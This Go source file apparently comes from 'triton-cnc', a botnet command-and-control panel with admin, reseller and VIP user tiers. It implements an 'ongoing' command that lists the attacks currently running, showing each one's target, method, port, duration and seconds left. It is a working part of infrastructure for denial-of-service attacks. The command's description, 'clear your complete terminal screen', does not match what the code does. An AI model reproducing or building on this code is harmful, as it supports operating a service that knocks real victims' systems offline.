package util_Command

import (
	"fmt"
	"strconv"
	"strings"
	"time"
	"triton-cnc/core/mysql"
	"triton-cnc/core/sessions/sessions"
	"triton-cnc/core/models/json/build"

	"github.com/alexeyco/simpletable"
)


func init() {

	Register(&Command{
		Name: "ongoing",

		Description: "clear your complete terminal screen",

		Admin: false,
		Reseller: false,
		Vip: false,

		Execute: func(Session *sessions.Session_Store, cmd []string) error {

			table := simpletable.New()

			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;11m#\x1b[38;5;15m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mTarget\x1b[38;5;15m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mMethod\x1b[38;5;15m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mPort\x1b[38;5;15m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mLength\x1b[38;5;15m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mTime\x1b"+build.Config.AppConfig.AppColour+"-\x1b[38;5;15mLeft\x1b[38;5;15m"},
				},
			}
		
			Running, error := database.Ongoing()
			if error != nil {
				return error
			}
	
			if Running == nil {
				Session.Channel.Write([]byte("\x1b[38;5;15mCurrently there is \x1b"+build.Config.AppConfig.AppColour+"0\x1b[38;5;15m Attacks running\x1b[38;5;15m\r\n"))
				return nil
			}
		
			for _, I := range Running {
				r := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;11m"+strconv.Itoa(I.ID)+"\x1b[38;5;15m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m"+I.Target+"\x1b[38;5;15m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m"+SortMethodSpace(I.Method)+"\x1b[38;5;15m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m"+strconv.Itoa(I.Port)+"\x1b[38;5;15m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m"+strconv.Itoa(I.Duration)+"\x1b[38;5;15m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m"+fmt.Sprintf("%.0f secs", time.Until(time.Unix(I.End, 0)).Seconds())+"\x1b[38;5;15m"},
				}
	
				table.Body.Cells = append(table.Body.Cells, r)
			}
		
			if build.Config.Extra.TableType == "unicode" {
				table.SetStyle(simpletable.StyleUnicode)
			} else if build.Config.Extra.TableType == "lite" {
				table.SetStyle(simpletable.StyleCompactLite)
			} else {
				table.SetStyle(simpletable.StyleCompactClassic)
			}
			
						
			fmt.Fprint(Session.Channel, "")
			fmt.Fprintln(Session.Channel, strings.ReplaceAll(table.String(), "\n", "\r\n"))
			fmt.Fprint(Session.Channel, "\r")
			return nil
		},
	})
}

func SortMethodSpace(name string) string {
	name = strings.ReplaceAll(name, " ", "\x1b"+build.Config.AppConfig.AppColour+"-\x1b[38;5;15m")
	name = strings.ReplaceAll(name, "-", "\x1b"+build.Config.AppConfig.AppColour+"-\x1b[38;5;15m")
	name = strings.ReplaceAll(name, "=", "\x1b"+build.Config.AppConfig.AppColour+"-\x1b[38;5;15m")
	return name
}